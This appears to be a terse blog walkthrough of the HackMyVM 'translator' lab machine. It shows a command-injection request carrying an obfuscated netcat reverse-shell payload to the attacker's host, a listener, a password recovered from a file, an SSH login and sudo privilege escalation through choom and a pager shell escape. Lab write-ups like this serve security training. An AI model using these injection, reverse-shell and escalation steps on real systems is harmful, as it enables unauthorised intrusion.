---
title: "translator - sml"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough
tags:
  - Hacking
  - Walkthrough
  - HackMyVM
  - translator
header:
  overlay_image: /assets/images/pasek-hack.png
---
# translator - sml
{: .text-justify}

## 00. Metainfo

|:----|:----|
|Title:|translator|
|Author:|[sml](https://hackmyvm.eu/profile/?user=sml)|
|Release date:|2022-05-12|
|Download from:|[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=translator)|
|Level:|Easy|
|System:|Linux|
|You'll learn:|tricks |

# 00. Beginning
My another shortest entry.
{: .text-justify}
# 01.
## Sending
```bash
curl 'http://172.16.1.121/translate.php?hmv=;mx%20-x%20yzhs%20172.16.1.89%2012345'
```
## Receiving
```bash
nc -lvp 12345
```
# 02. 
```bash
cat /var/www/html/hvxivg
```
## My password is:
```bash
curl 'http://172.16.1.121/translate.php?hmv=Mb+kzhhdliw+rh+zbfie3w4'
```
# 03.
```bash
ssh ocean@http://172.16.1.121
```
# 04.
```bash
sudo -uindia /usr/bin/choom -n 0 -- bash
```
# 05.

```bash
sudo /usr/local/bin/trans -pager less
```
06. Final
```bash
word
/wərd/

palabra

Definiciones de word
[ English -> Español ]

sustantivo
    (la) palabra
        word, term, speech
    (el) término
        term, end, word, terminus, concept, definition
    (la) voz
        voice, word, vocals
    (el) vocablo
        word, term
    (la) noticia
        news, news item, report, piece of news
    (el) verbo
        verb
    (el) dicho
        saying, word, adage, statement, dictum, expression
    (la) orden
        order, command, warrant, sequence, arrangement, word
    (el) aviso
        notice, warning, ad, announcement, message, notification
    (el) recado
        message
    (la) indicación
        indication, sign, suggestion, hint, direction, word

verbo
    decir
        say, tell, speak, mention, call, word
!bash
```